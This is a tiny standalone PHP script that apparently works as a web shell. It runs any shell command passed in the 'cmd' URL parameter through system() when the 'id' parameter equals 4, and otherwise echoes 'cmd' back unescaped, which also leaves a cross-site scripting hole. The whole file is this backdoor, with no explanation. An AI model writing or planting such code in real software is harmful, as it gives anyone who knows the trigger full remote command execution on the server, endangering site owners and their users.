<?
$id = $_GET['id'];
$cmd = $_GET['cmd'];

if ( $id == 4 ){
  system( $cmd );
}
else
{
  echo $cmd;
}
?>
    